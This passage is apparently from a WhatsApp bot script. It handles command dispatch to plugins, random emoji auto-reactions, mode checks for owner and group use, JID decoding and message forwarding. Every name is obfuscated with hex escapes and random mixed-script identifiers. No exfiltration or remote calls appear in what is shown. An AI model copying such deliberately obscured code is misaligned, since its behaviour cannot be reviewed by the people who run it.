f','\ud83e\udddf',hexanodecode_了起也チ都然去(0x35a),'\ud83e\uddde',hexanodecode_了起也チ都然去(0x277),hexanodecode_了起也チ都然去(0x3ae),hexanodecode_了起也チ都然去(0x3c8),hexanodecode_了起也チ都然去(0x1ea),hexanodecode_了起也チ都然去(0x1ec),'\ud83e\udd37',hexanodecode_了起也チ都然去(0x39b),'\ud83e\udd26',hexanodecode_了起也チ都然去(0x342),hexanodecode_了起也チ都然去(0x303),'\ud83d\udc87','\ud83d\udc83',hexanodecode_了起也チ都然去(0x209),'\ud83d\udeb6','\ud83e\uddf6','\ud83e\udde4','\ud83d\udc51','\ud83d\udc8d','\ud83d\udc5d','\ud83d\udcbc','\ud83c\udf92','\ud83e\udd7d','\ud83d\udc3b','\ud83d\udc3c','\ud83d\udc2d','\ud83d\udc23','\ud83e\udebf','\ud83e\udd86','\ud83e\udd8a','\ud83e\udd8b','\ud83e\udd84','\ud83e\udebc','\ud83d\udc0b','\ud83d\udc33','\ud83e\udd88','\ud83d\udc0d',hexanodecode_了起也チ都然去(0x1bc),'\ud83e\udda6','\ud83e\udd9a','\ud83c\udf31','\ud83c\udf43','\ud83c\udf8d','\ud83c\udf3f','\u2618\ufe0f','\ud83c\udf40','\ud83c\udf41','\ud83e\udeba','\ud83c\udf44','\ud83c\udf44\u200d\ud83d\udfeb','\ud83e\udeb8','\ud83e\udea8','\ud83c\udf3a','\ud83e\udeb7','\ud83e\udebb','\ud83e\udd40','\ud83c\udf39','\ud83c\udf37','\ud83d\udc90','\ud83c\udf3e','\ud83c\udf38','\ud83c\udf3c','\ud83c\udf3b','\ud83c\udf1d','\ud83c\udf1a','\ud83c\udf15','\ud83c\udf0e','\ud83d\udcab','\ud83d\udd25','\u2603\ufe0f','\u2744\ufe0f',hexanodecode_了起也チ都然去(0x24a),'\ud83e\udee7','\ud83c\udf5f','\ud83c\udf6b','\ud83e\uddc3','\ud83e\uddca','\ud83e\ude80','\ud83e\udd3f','\ud83c\udfc6','\ud83e\udd47','\ud83e\udd48','\ud83e\udd49',hexanodecode_了起也チ都然去(0x1f5),'\ud83e\udd39',hexanodecode_了起也チ都然去(0x261),'\ud83c\udfa7','\ud83c\udfa4','\ud83e\udd41','\ud83e\udde9','\ud83c\udfaf','\ud83d\ude80','\ud83d\ude81','\ud83d\uddff','\ud83c\udf99\ufe0f','\u231b','\u23f3','\ud83d\udcb8','\ud83d\udc8e','\u2699\ufe0f','\u26d3\ufe0f','\ud83d\udd2a','\ud83e\uddf8','\ud83c\udf80','\ud83e\ude84','\ud83c\udf88','\ud83c\udf81','\ud83c\udf89','\ud83c\udfee','\ud83e\udea9','\ud83d\udce9','\ud83d\udc8c','\ud83d\udce4','\ud83d\udce6','\ud83d\udcca','\ud83d\udcc8','\ud83d\udcd1','\ud83d\udcc9','\ud83d\udcc2','\ud83d\udd16','\ud83e\uddf7','\ud83d\udccc','\ud83d\udcdd','\ud83d\udd0f','\ud83d\udd10','\ud83e\ude77','\u2764\ufe0f','\ud83e\udde1','\ud83d\udc9b','\ud83d\udc9a','\ud83e\ude75','\ud83d\udc99','\ud83d\udc9c','\ud83d\udda4','\ud83e\ude76','\ud83e\udd0d','\ud83e\udd0e','\u2764\u200d\ud83d\udd25','\u2764\u200d\ud83e\ude79','\ud83d\udc97','\ud83d\udc96','\ud83d\udc98','\ud83d\udc9d','\u274c','\u2705','\ud83d\udd30','\u303d\ufe0f','\ud83c\udf10','\ud83c\udf00','\u2934\ufe0f','\u2935\ufe0f','\ud83d\udd34','\ud83d\udfe2','\ud83d\udfe1','\ud83d\udfe0','\ud83d\udd35','\ud83d\udfe3','\u26ab','\u26aa','\ud83d\udfe4','\ud83d\udd07','\ud83d\udd0a','\ud83d\udce2','\ud83d\udd15','\u2665\ufe0f','\ud83d\udd50','\ud83d\udea9','\ud83c\uddf5\ud83c\uddf0'],hexanodecode_可صク定子=hexanodecode_ウ度然同种外年们ج[Math[hexanodecode_了起也チ都然去(0x3d4)](Math['\x72\x61\x6e\x64\x6f'+'\x6d']()*hexanodecode_ウ度然同种外年们ج[hexanodecode_了起也チ都然去(0x19a)+'\x68'])];hexanodecode_い着是ص以ソウ外[hexanodecode_了起也チ都然去(0x1b3)](hexanodecode_可صク定子);}if(!hexanodecode_然家وص等就フ后二&&config[hexanodecode_了起也チ都然去(0x1fe)+'\x4d\x5f\x52\x45\x41'+'\x43\x54']===hexanodecode_了起也チ都然去(0xf1)){const hexanodecode_ببضخウツ=(config[hexanodecode_了起也チ都然去(0x1fe)+'\x4d\x5f\x52\x45\x41'+hexanodecode_了起也チ都然去(0x3c0)+hexanodecode_了起也チ都然去(0x3da)]||hexanodecode_了起也チ都然去(0x1e3)+'\x2c\ud83d\ude42\x2c\ud83d\ude14')[hexanodecode_了起也チ都然去(0x120)]('\x2c'),hexanodecode_分キ一ひن以マ国使=hexanodecode_ببضخウツ[Math[hexanodecode_了起也チ都然去(0x3d4)](Math[hexanodecode_了起也チ都然去(0x11c)+'\x6d']()*hexanodecode_ببضخウツ['\x6c\x65\x6e\x67\x74'+'\x68'])];hexanodecode_い着是ص以ソウ外[hexanodecode_了起也チ都然去(0x1b3)](hexanodecode_分キ一ひن以マ国使);}if(!hexanodecode_ممテ政&&config['\x4d\x4f\x44\x45']===hexanodecode_了起也チ都然去(0x1cc)+'\x74\x65')return;if(!hexanodecode_ممテ政&&hexanodecode_就人业ぬ所جホ&&config['\x4d\x4f\x44\x45']===hexanodecode_了起也チ都然去(0x23d))return;if(!hexanodecode_ممテ政&&!hexanodecode_就人业ぬ所جホ&&config['\x4d\x4f\x44\x45']===hexanodecode_了起也チ都然去(0x1f0)+'\x73')return;const hexanodecode_发ゆをにق从政合=require(hexanodecode_了起也チ都然去(0x1f8)+hexanodecode_了起也チ都然去(0x3f4)),hexanodecode_ラセ作ろ=hexanodecode_制动的ねせ说好そ体?hexanodecode_时ツムく[hexanodecode_了起也チ都然去(0x20f)](0x1*0x1eb1+0x1*0x2197+-0x4047)[hexanodecode_了起也チ都然去(0x2fd)]()[hexanodecode_了起也チ都然去(0x120)]('\x20')[0x108b+-0x1*-0x1ceb+-0x2d76]['\x74\x6f\x4c\x6f\x77'+hexanodecode_了起也チ都然去(0x1cf)+'\x65']():![];if(hexanodecode_制动的ねせ说好そ体){const hexanodecode_个经サせ=hexanodecode_发ゆをにق从政合[hexanodecode_了起也チ都然去(0x17d)+'\x6e\x64\x73']['\x66\x69\x6e\x64'](hexanodecode_去اハシ主因をを年=>hexanodecode_去اハシ主因をを年[hexanodecode_了起也チ都然去(0x1eb)+'\x72\x6e']===hexanodecode_ラセ作ろ)||hexanodecode_发ゆをにق从政合[hexanodecode_了起也チ都然去(0x17d)+'\x6e\x64\x73'][hexanodecode_了起也チ都然去(0x243)](hexanodecode_外年性دフ=>hexanodecode_外年性دフ[hexanodecode_了起也チ都然去(0x2b0)]&&hexanodecode_外年性دフ['\x61\x6c\x69\x61\x73']['\x69\x6e\x63\x6c\x75'+hexanodecode_了起也チ都然去(0x2ba)](hexanodecode_ラセ作ろ));if(hexanodecode_个经サせ){if(hexanodecode_个经サせ[hexanodecode_了起也チ都然去(0x1b3)])hexanodecode_于度ن有[hexanodecode_了起也チ都然去(0x357)+hexanodecode_了起也チ都然去(0x33e)+'\x65'](hexanodecode_产行ホ要,{'\x72\x65\x61\x63\x74':{'\x74\x65\x78\x74':hexanodecode_个经サせ[hexanodecode_了起也チ都然去(0x1b3)],'\x6b\x65\x79':hexanodecode_它ز部上行[hexanodecode_了起也チ都然去(0x278)]}});try{const hexanodecode_ンレンテのこ外={};hexanodecode_ンレンテのこ外['\x66\x72\x6f\x6d']=hexanodecode_产行ホ要,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x2c2)+'\x64']=hexanodecode_りモさわ性メれ,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x36b)]=hexanodecode_时ツムく,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x296)]=hexanodecode_制动的ねせ说好そ体,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x17d)+'\x6e\x64']=hexanodecode_民生メ产高ظ,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x395)]=hexanodecode_イニひ过国ط,hexanodecode_ンレンテのこ外['\x71']=hexanodecode_当あスキ,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x155)]=hexanodecode_て同经动力ウ,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x3b3)+'\x75\x70']=hexanodecode_就人业ぬ所جホ,hexanodecode_ンレンテのこ外['\x73\x65\x6e\x64\x65'+'\x72']=hexanodecode_せ有ロひب一カもワ,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x172)+hexanodecode_了起也チ都然去(0x2ef)+'\x65\x72']=hexanodecode_のれか人我,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x3d8)+hexanodecode_了起也チ都然去(0x325)]=hexanodecode_等自过ي前成,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x3d8)+hexanodecode_了起也チ都然去(0x101)]=hexanodecode_还ち度キなに,hexanodecode_ンレンテのこ外['\x70\x75\x73\x68\x6e'+hexanodecode_了起也チ都然去(0x34e)]=hexanodecode_些三而水有おね,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x32f)]=hexanodecode_化它シレ分,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x2b2)+'\x65\x72']=hexanodecode_ممテ政,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0xfc)+hexanodecode_了起也チ都然去(0xff)]=hexanodecode_高فه生以前二,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x1f0)+hexanodecode_了起也チ都然去(0x3fd)+hexanodecode_了起也チ都然去(0x15e)]=hexanodecode_テれセ这ミのえ为,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x1f0)+'\x4e\x61\x6d\x65']=hexanodecode_上体ع里,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x1db)+hexanodecode_了起也チ都然去(0x362)+'\x74\x73']=hexanodecode_之む把ナサな得产本,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x1f0)+hexanodecode_了起也チ都然去(0x402)+'\x73']=hexanodecode_一大要政は到ラ,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0xed)+hexanodecode_了起也チ都然去(0x402)+'\x73']=hexanodecode_غエخف下合よヌ,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x210)+hexanodecode_了起也チ都然去(0x18d)]=hexanodecode_ニ发能フك,hexanodecode_ンレンテのこ外[hexanodecode_了起也チ都然去(0x12d)]=hexanodecode_对くルل行两化一可,hexanodecode_个经サせ[hexanodecode_了起也チ都然去(0x23a)+hexanodecode_了起也チ都然去(0x2e4)](hexanodecode_于度ن有,hexanodecode_它ز部上行,hexanodecode_い着是ص以ソウ外,hexanodecode_ンレンテのこ外);}catch(hexanodecode_ルわ水サ里){console['\x65\x72\x72\x6f\x72'](hexanodecode_了起也チ都然去(0x2f6)+hexanodecode_了起也チ都然去(0x2bf)+hexanodecode_了起也チ都然去(0x2ab)+hexanodecode_ルわ水サ里);}}}hexanodecode_发ゆをにق从政合[hexanodecode_了起也チ都然去(0x17d)+hexanodecode_了起也チ都然去(0x233)][hexanodecode_了起也チ都然去(0x147)](async hexanodecode_以能把い进应わ=>{const hexanodecode_水い种水ه大工行应=hexanodecode_了起也チ都然去;if(hexanodecode_时ツムく&&hexanodecode_以能把い进应わ['\x6f\x6e']===hexanodecode_水い种水ه大工行应(0x36b))hexanodecode_以能把い进应わ[hexanodecode_水い种水ه大工行应(0x23a)+'\x69\x6f\x6e'](hexanodecode_于度ن有,hexanodecode_它ز部上行,hexanodecode_い着是ص以ソウ外,{'\x66\x72\x6f\x6d':hexanodecode_产行ホ要,'\x6c':l,'\x71\x75\x6f\x74\x65\x64':hexanodecode_りモさわ性メれ,'\x62\x6f\x64\x79':hexanodecode_时ツムく,'\x69\x73\x43\x6d\x64':hexanodecode_制动的ねせ说好そ体,'\x63\x6f\x6d\x6d\x61\x6e\x64':hexanodecode_以能把い进应わ,'\x61\x72\x67\x73':hexanodecode_イニひ过国ط,'\x71':hexanodecode_当あスキ,'\x74\x65\x78\x74':hexanodecode_て同经动力ウ,'\x69\x73\x47\x72\x6f\x75\x70':hexanodecode_就人业ぬ所جホ,'\x73\x65\x6e\x64\x65\x72':hexanodecode_せ有ロひب一カもワ,'\x73\x65\x6e\x64\x65\x72\x4e\x75\x6d\x62\x65\x72':hexanodecode_のれか人我,'\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72\x32':hexanodecode_等自过ي前成,'\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72':hexanodecode_还ち度キなに,'\x70\x75\x73\x68\x6e\x61\x6d\x65':hexanodecode_些三而水有おね,'\x69\x73\x4d\x65':hexanodecode_化它シレ分,'\x69\x73\x4f\x77\x6e\x65\x72':hexanodecode_ممテ政,'\x69\x73\x43\x72\x65\x61\x74\x6f\x72':hexanodecode_高فه生以前二,'\x67\x72\x6f\x75\x70\x4d\x65\x74\x61\x64\x61\x74\x61':hexanodecode_テれセ这ミのえ为,'\x67\x72\x6f\x75\x70\x4e\x61\x6d\x65':hexanodecode_上体ع里,'\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74\x73':hexanodecode_之む把ナサな得产本,'\x67\x72\x6f\x75\x70\x41\x64\x6d\x69\x6e\x73':hexanodecode_一大要政は到ラ,'\x69\x73\x42\x6f\x74\x41\x64\x6d\x69\x6e\x73':hexanodecode_غエخف下合よヌ,'\x69\x73\x41\x64\x6d\x69\x6e\x73':hexanodecode_ニ发能フك,'\x72\x65\x70\x6c\x79':hexanodecode_对くルل行两化一可});else{if(hexanodecode_它ز部上行['\x71']&&hexanodecode_以能把い进应わ['\x6f\x6e']===hexanodecode_水い种水ه大工行应(0x155))hexanodecode_以能把い进应わ[hexanodecode_水い种水ه大工行应(0x23a)+'\x69\x6f\x6e'](hexanodecode_于度ن有,hexanodecode_它ز部上行,hexanodecode_い着是ص以ソウ外,{'\x66\x72\x6f\x6d':hexanodecode_产行ホ要,'\x6c':l,'\x71\x75\x6f\x74\x65\x64':hexanodecode_りモさわ性メれ,'\x62\x6f\x64\x79':hexanodecode_时ツムく,'\x69\x73\x43\x6d\x64':hexanodecode_制动的ねせ说好そ体,'\x63\x6f\x6d\x6d\x61\x6e\x64':hexanodecode_以能把い进应わ,'\x61\x72\x67\x73':hexanodecode_イニひ过国ط,'\x71':hexanodecode_当あスキ,'\x74\x65\x78\x74':hexanodecode_て同经动力ウ,'\x69\x73\x47\x72\x6f\x75\x70':hexanodecode_就人业ぬ所جホ,'\x73\x65\x6e\x64\x65\x72':hexanodecode_せ有ロひب一カもワ,'\x73\x65\x6e\x64\x65\x72\x4e\x75\x6d\x62\x65\x72':hexanodecode_のれか人我,'\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72\x32':hexanodecode_等自过ي前成,'\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72':hexanodecode_还ち度キなに,'\x70\x75\x73\x68\x6e\x61\x6d\x65':hexanodecode_些三而水有おね,'\x69\x73\x4d\x65':hexanodecode_化它シレ分,'\x69\x73\x4f\x77\x6e\x65\x72':hexanodecode_ممテ政,'\x69\x73\x43\x72\x65\x61\x74\x6f\x72':hexanodecode_高فه生以前二,'\x67\x72\x6f\x75\x70\x4d\x65\x74\x61\x64\x61\x74\x61':hexanodecode_テれセ这ミのえ为,'\x67\x72\x6f\x75\x70\x4e\x61\x6d\x65':hexanodecode_上体ع里,'\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74\x73':hexanodecode_之む把ナサな得产本,'\x67\x72\x6f\x75\x70\x41\x64\x6d\x69\x6e\x73':hexanodecode_一大要政は到ラ,'\x69\x73\x42\x6f\x74\x41\x64\x6d\x69\x6e\x73':hexanodecode_غエخف下合よヌ,'\x69\x73\x41\x64\x6d\x69\x6e\x73':hexanodecode_ニ发能フك,'\x72\x65\x70\x6c\x79':hexanodecode_对くルل行两化一可});else{if((hexanodecode_以能把い进应わ['\x6f\x6e']==='\x69\x6d\x61\x67\x65'||hexanodecode_以能把い进应わ['\x6f\x6e']===hexanodecode_水い种水ه大工行应(0x102))&&hexanodecode_它ز部上行[hexanodecode_水い种水ه大工行应(0x113)]==='\x69\x6d\x61\x67\x65'+hexanodecode_水い种水ه大工行应(0x158)+'\x67\x65')hexanodecode_以能把い进应わ['\x66\x75\x6e\x63\x74'+hexanodecode_水い种水ه大工行应(0x2e4)](hexanodecode_于度ن有,hexanodecode_它ز部上行,hexanodecode_い着是ص以ソウ外,{'\x66\x72\x6f\x6d':hexanodecode_产行ホ要,'\x6c':l,'\x71\x75\x6f\x74\x65\x64':hexanodecode_りモさわ性メれ,'\x62\x6f\x64\x79':hexanodecode_时ツムく,'\x69\x73\x43\x6d\x64':hexanodecode_制动的ねせ说好そ体,'\x63\x6f\x6d\x6d\x61\x6e\x64':hexanodecode_以能把い进应わ,'\x61\x72\x67\x73':hexanodecode_イニひ过国ط,'\x71':hexanodecode_当あスキ,'\x74\x65\x78\x74':hexanodecode_て同经动力ウ,'\x69\x73\x47\x72\x6f\x75\x70':hexanodecode_就人业ぬ所جホ,'\x73\x65\x6e\x64\x65\x72':hexanodecode_せ有ロひب一カもワ,'\x73\x65\x6e\x64\x65\x72\x4e\x75\x6d\x62\x65\x72':hexanodecode_のれか人我,'\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72\x32':hexanodecode_等自过ي前成,'\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72':hexanodecode_还ち度キなに,'\x70\x75\x73\x68\x6e\x61\x6d\x65':hexanodecode_些三而水有おね,'\x69\x73\x4d\x65':hexanodecode_化它シレ分,'\x69\x73\x4f\x77\x6e\x65\x72':hexanodecode_ممテ政,'\x69\x73\x43\x72\x65\x61\x74\x6f\x72':hexanodecode_高فه生以前二,'\x67\x72\x6f\x75\x70\x4d\x65\x74\x61\x64\x61\x74\x61':hexanodecode_テれセ这ミのえ为,'\x67\x72\x6f\x75\x70\x4e\x61\x6d\x65':hexanodecode_上体ع里,'\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74\x73':hexanodecode_之む把ナサな得产本,'\x67\x72\x6f\x75\x70\x41\x64\x6d\x69\x6e\x73':hexanodecode_一大要政は到ラ,'\x69\x73\x42\x6f\x74\x41\x64\x6d\x69\x6e\x73':hexanodecode_غエخف下合よヌ,'\x69\x73\x41\x64\x6d\x69\x6e\x73':hexanodecode_ニ发能フك,'\x72\x65\x70\x6c\x79':hexanodecode_对くルل行两化一可});else hexanodecode_以能把い进应わ['\x6f\x6e']===hexanodecode_水い种水ه大工行应(0xe0)+'\x65\x72'&&hexanodecode_它ز部上行[hexanodecode_水い种水ه大工行应(0x113)]===hexanodecode_水い种水ه大工行应(0xe0)+hexanodecode_水い种水ه大工行应(0x2cb)+hexanodecode_水い种水ه大工行应(0x3dd)&&hexanodecode_以能把い进应わ['\x66\x75\x6e\x63\x74'+hexanodecode_水い种水ه大工行应(0x2e4)](hexanodecode_于度ن有,hexanodecode_它ز部上行,hexanodecode_い着是ص以ソウ外,{'\x66\x72\x6f\x6d':hexanodecode_产行ホ要,'\x6c':l,'\x71\x75\x6f\x74\x65\x64':hexanodecode_りモさわ性メれ,'\x62\x6f\x64\x79':hexanodecode_时ツムく,'\x69\x73\x43\x6d\x64':hexanodecode_制动的ねせ说好そ体,'\x63\x6f\x6d\x6d\x61\x6e\x64':hexanodecode_以能把い进应わ,'\x61\x72\x67\x73':hexanodecode_イニひ过国ط,'\x71':hexanodecode_当あスキ,'\x74\x65\x78\x74':hexanodecode_て同经动力ウ,'\x69\x73\x47\x72\x6f\x75\x70':hexanodecode_就人业ぬ所جホ,'\x73\x65\x6e\x64\x65\x72':hexanodecode_せ有ロひب一カもワ,'\x73\x65\x6e\x64\x65\x72\x4e\x75\x6d\x62\x65\x72':hexanodecode_のれか人我,'\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72\x32':hexanodecode_等自过ي前成,'\x62\x6f\x74\x4e\x75\x6d\x62\x65\x72':hexanodecode_还ち度キなに,'\x70\x75\x73\x68\x6e\x61\x6d\x65':hexanodecode_些三而水有おね,'\x69\x73\x4d\x65':hexanodecode_化它シレ分,'\x69\x73\x4f\x77\x6e\x65\x72':hexanodecode_ممテ政,'\x69\x73\x43\x72\x65\x61\x74\x6f\x72':hexanodecode_高فه生以前二,'\x67\x72\x6f\x75\x70\x4d\x65\x74\x61\x64\x61\x74\x61':hexanodecode_テれセ这ミのえ为,'\x67\x72\x6f\x75\x70\x4e\x61\x6d\x65':hexanodecode_上体ع里,'\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6e\x74\x73':hexanodecode_之む把ナサな得产本,'\x67\x72\x6f\x75\x70\x41\x64\x6d\x69\x6e\x73':hexanodecode_一大要政は到ラ,'\x69\x73\x42\x6f\x74\x41\x64\x6d\x69\x6e\x73':hexanodecode_غエخف下合よヌ,'\x69\x73\x41\x64\x6d\x69\x6e\x73':hexanodecode_ニ发能フك,'\x72\x65\x70\x6c\x79':hexanodecode_对くルل行两化一可});}}});}catch(hexanodecode_从有も还就ナزカ){console[hexanodecode_了起也チ都然去(0x1a7)](hexanodecode_了起也チ都然去(0x1dc)+'\x41\x47\x45\x20\x48'+hexanodecode_了起也チ都然去(0x1a8)+hexanodecode_了起也チ都然去(0x1d6)+hexanodecode_了起也チ都然去(0x232),hexanodecode_从有も还就ナزカ);}}),hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x379)+'\x65\x4a\x69\x64']=hexanodecode_就ヲ主のん=>{const hexanodecode_到生ヨ电点ヲア说ق=hexanodecode_地会这フ过两;if(!hexanodecode_就ヲ主のん)return hexanodecode_就ヲ主のん;if(/:\d+@/gi[hexanodecode_到生ヨ电点ヲア说ق(0x2c7)](hexanodecode_就ヲ主のん)){let hexanodecode_我リ上工ち出子小カ=jidDecode(hexanodecode_就ヲ主のん)||{};return hexanodecode_我リ上工ち出子小カ[hexanodecode_到生ヨ电点ヲア说ق(0x349)]&&hexanodecode_我リ上工ち出子小カ['\x73\x65\x72\x76\x65'+'\x72']&&hexanodecode_我リ上工ち出子小カ[hexanodecode_到生ヨ电点ヲア说ق(0x349)]+'\x40'+hexanodecode_我リ上工ち出子小カ['\x73\x65\x72\x76\x65'+'\x72']||hexanodecode_就ヲ主のん;}else return hexanodecode_就ヲ主のん;},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x3d9)+'\x46\x6f\x72\x77\x61'+'\x72\x64']=async(hexanodecode_它由د学めは对,hexanodecode_前化性ظヨه外き产,hexanodecode_なへ等ラヘ开و把主=![],hexanodecode_它のي地ホ使理ラ方={})=>{const hexanodecode_カ子中三ذ=hexanodecode_地会这フ过两;let hexanodecode_为们ルリ有はメ;hexanodecode_它のي地ホ使理ラ方[hexanodecode_カ子中三ذ(0x2e9)+hexanodecode_カ子中三ذ(0x14a)+'\x63\x65']&&(hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65']=hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65']&&hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65'][hexanodecode_カ子中三ذ(0x3c6)+hexanodecode_カ子中三ذ(0x34c)+hexanodecode_カ子中三ذ(0x33e)+'\x65']&&hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65']['\x65\x70\x68\x65\x6d'+hexanodecode_カ子中三ذ(0x34c)+'\x65\x73\x73\x61\x67'+'\x65'][hexanodecode_カ子中三ذ(0x194)+'\x67\x65']?hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65'][hexanodecode_カ子中三ذ(0x3c6)+hexanodecode_カ子中三ذ(0x34c)+'\x65\x73\x73\x61\x67'+'\x65'][hexanodecode_カ子中三ذ(0x194)+'\x67\x65']:hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65']||undefined,hexanodecode_为们ルリ有はメ=Object[hexanodecode_カ子中三ذ(0x29b)](hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65'][hexanodecode_カ子中三ذ(0x237)+hexanodecode_カ子中三ذ(0x3df)+hexanodecode_カ子中三ذ(0x2d6)][hexanodecode_カ子中三ذ(0x194)+'\x67\x65'])[-0x14c8+-0x1b7+-0x1bb*-0xd],delete(hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65']&&hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65'][hexanodecode_カ子中三ذ(0x139)+'\x65']?hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65'][hexanodecode_カ子中三ذ(0x139)+'\x65']:hexanodecode_前化性ظヨه外き产['\x6d\x65\x73\x73\x61'+'\x67\x65']||undefined),delete hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65'][hexanodecode_カ子中三ذ(0x237)+hexanodecode_カ子中三ذ(0x3df)+hexanodecode_カ子中三ذ(0x2d6)][hexanodecode_カ子中三ذ(0x194)+'\x67\x65'][hexanodecode_为们ルリ有はメ][hexanodecode_カ子中三ذ(0x237)+'\x6e\x63\x65'],hexanodecode_前化性ظヨه外き产['\x6d\x65\x73\x73\x61'+'\x67\x65']={...hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65']['\x76\x69\x65\x77\x4f'+hexanodecode_カ子中三ذ(0x3df)+'\x73\x73\x61\x67\x65'][hexanodecode_カ子中三ذ(0x194)+'\x67\x65']});let hexanodecode_等た成けい我ら=Object[hexanodecode_カ子中三ذ(0x29b)](hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65'])[-0x237b+0x67*-0x11+-0x1*-0x2a52],hexanodecode_在年水种=await generateForwardMessageContent(hexanodecode_前化性ظヨه外き产,hexanodecode_なへ等ラヘ开و把主),hexanodecode_开现大之而作=Object[hexanodecode_カ子中三ذ(0x29b)](hexanodecode_在年水种)[-0x1743+-0x212f+0x3872],hexanodecode_然能会ス={};if(hexanodecode_等た成けい我ら!='\x63\x6f\x6e\x76\x65'+'\x72\x73\x61\x74\x69'+'\x6f\x6e')hexanodecode_然能会ス=hexanodecode_前化性ظヨه外き产[hexanodecode_カ子中三ذ(0x194)+'\x67\x65'][hexanodecode_等た成けい我ら]['\x63\x6f\x6e\x74\x65'+hexanodecode_カ子中三ذ(0x1da)+'\x6f'];hexanodecode_在年水种[hexanodecode_开现大之而作]['\x63\x6f\x6e\x74\x65'+hexanodecode_カ子中三ذ(0x1da)+'\x6f']={...hexanodecode_然能会ス,...hexanodecode_在年水种[hexanodecode_开现大之而作][hexanodecode_カ子中三ذ(0x137)+hexanodecode_カ子中三ذ(0x1da)+'\x6f']};const hexanodecode_しロ有の加ひ实发=await generateWAMessageFromContent(hexanodecode_它由د学めは对,hexanodecode_在年水种,hexanodecode_它のي地ホ使理ラ方?{...hexanodecode_在年水种[hexanodecode_开现大之而作],...hexanodecode_它のي地ホ使理ラ方,...hexanodecode_它のي地ホ使理ラ方[hexanodecode_カ子中三ذ(0x137)+hexanodecode_カ子中三ذ(0x1da)+'\x6f']?{'\x63\x6f\x6e\x74\x65\x78\x74\x49\x6e\x66\x6f':{...hexanodecode_在年水种[hexanodecode_开现大之而作][hexanodecode_カ子中三ذ(0x137)+'\x78\x74\x49\x6e\x66'+'\x6f'],...hexanodecode_它のي地ホ使理ラ方[hexanodecode_カ子中三ذ(0x137)+'\x78\x74\x49\x6e\x66'+'\x6f']}}:{}}:{});return await hexanodecode_于度ن有[hexanodecode_カ子中三ذ(0x38f)+'\x4d\x65\x73\x73\x61'+'\x67\x65'](hexanodecode_它由د学めは对,hexanodecode_しロ有の加ひ实发[hexanodecode_カ子中三ذ(0x194)+'\x67\x65'],{'\x6d\x65\x73\x73\x61\x67\x65\x49\x64':hexanodecode_しロ有の加ひ实发[hexanodecode_カ子中三ذ(0x278)]['\x69\x64']}),hexanodecode_しロ有の加ひ实发;},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x394)+hexanodecode_地会这フ过两(0x15c)+hexanodecode_地会这フ过两(0x26d)+hexanodecode_地会这フ过两(0x3a9)+hexanodecode_地会这フ过两(0x158)+'\x67\x65']=async(hexanodecode_可ف们理ヒ,hexanodecode_トか来ヘ家モ物从进,hexanodecode_由キれモ使天も过=!![])=>{const hexanodecode_ا用方や=hexanodecode_地会这フ过两;let 